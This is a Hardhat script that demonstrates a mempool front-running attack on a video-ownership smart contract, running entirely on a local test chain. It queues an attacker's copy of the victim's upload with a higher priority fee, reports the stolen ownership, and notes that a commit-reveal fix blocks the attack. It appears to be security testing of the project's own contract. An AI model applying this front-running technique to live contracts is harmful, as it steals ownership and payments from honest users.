const hre = require("hardhat");
const { ethers } = hre;

// Front-running attack - DIRECTLY on the contract (bypasses the API).
//
// uploadVideo() grants permanent ownership of a CID to whoever registers it FIRST,
// with no proof that the caller owns the content. The CID travels through the public
// mempool in the clear, so an attacker can copy it and submit their own
// uploadVideo(cid) with a higher priority fee (tip). The node orders the mempool by
// tip, so the attacker's transaction is mined first and wins ownership forever; the
// honest uploader's transaction then reverts with "Video already exists".
//
// It needs more than one pending transaction in the mempool at once, so automining
// is turned off, both transactions are allowed to queue, then a block is mined.
// The script simply runs the attack and reports the outcome.

const GWEI = (n) => ethers.parseUnits(String(n), "gwei");

// Mine blocks until `hash` has a receipt, then return it (a reverting tx may spill
// into the next block, and a reverted tx's .wait() can hang the in-process provider).
async function mineUntilMined(hash, maxBlocks = 3) {
  let receipt = null;
  for (let i = 0; i < maxBlocks && receipt === null; i++) {
    await ethers.provider.send("evm_mine", []);
    receipt = await ethers.provider.getTransactionReceipt(hash);
  }
  return receipt;
}

async function main() {
  const [deployer, victim, attacker] = await ethers.getSigners();

  console.log("=== Front-running - direct contract attack ===\n");

  const VS = await ethers.getContractFactory("VideoStreaming");
  const vs = await VS.deploy();
  await vs.waitForDeployment();
  console.log("VideoStreaming deployed at:", await vs.getAddress());
  console.log("Victim  :", victim.address);
  console.log("Attacker:", attacker.address);

  const cid = "QmVictimOriginalVideo";
  const price = ethers.parseEther("0.1");
  console.log(`\nVictim wants to register CID "${cid}" @ ${ethers.formatEther(price)} ETH`);

  try {
    // Stop automining so both transactions sit in the mempool together.
    await ethers.provider.send("evm_setAutomine", [false]);

    // The victim (as the backend would) broadcasts the upload with a LOW tip.
    const victimTx = await vs.connect(victim).uploadVideo(cid, price, {
      maxPriorityFeePerGas: GWEI(1), maxFeePerGas: GWEI(200),
    });
    console.log("\nVictim broadcast uploadVideo(cid) with tip = 1 gwei (pending in mempool)");

    // The attacker reads the CID from the mempool and front-runs with a HIGH tip.
    await vs.connect(attacker).uploadVideo(cid, price, {
      maxPriorityFeePerGas: GWEI(100), maxFeePerGas: GWEI(200),
    });
    console.log("Attacker sees the CID and front-runs uploadVideo(cid) with tip = 100 gwei");

    console.log("\nMining the mempool (ordered by tip) ...");
    const victimReceipt = await mineUntilMined(victimTx.hash);
    await ethers.provider.send("evm_setAutomine", [true]);

    const owner = (await vs.videos(cid)).owner;
    const victimReverted = victimReceipt !== null && victimReceipt.status === 0;

    console.log("\n--- Result ---");
    console.log("On-chain owner of the CID:", owner,
      owner === attacker.address ? "(ATTACKER)" : owner === victim.address ? "(VICTIM)" : "");
    console.log("Victim tx reverted       :", victimReverted, victimReverted ? "(Video already exists)" : "");
    if (owner === attacker.address && victimReverted) {
      console.log("\nAttack succeeded - the attacker stole ownership of the victim's CID.");
      console.log("The attacker now collects every purchase payment for that video.");
    } else {
      console.log("\nAttack failed - the victim kept ownership of the CID.");
    }
  } catch (e) {
    // Against the fixed (commit-reveal) contract the plain uploadVideo(cid, price)
    // call no longer exists, so the front-run cannot even be formed.
    await ethers.provider.send("evm_setAutomine", [true]).catch(() => {});
    const reason = (e.shortMessage || e.message || "").split("\n")[0];
    console.log("\n--- Result ---");
    console.log("Attack failed - the front-run could not be submitted.");
    console.log("Reason:", reason);
    console.log("\nThe contract now requires commit-reveal: uploadVideo(cid, price, salt)");
    console.log("with a prior commitVideo() bound to msg.sender. The old 2-argument");
    console.log("uploadVideo(cid, price) no longer exists, so a plain front-run is impossible.");
  }
}

main()
  .then(() => { process.exitCode = 0; })
  .catch((e) => { console.error(e); process.exitCode = 1; });
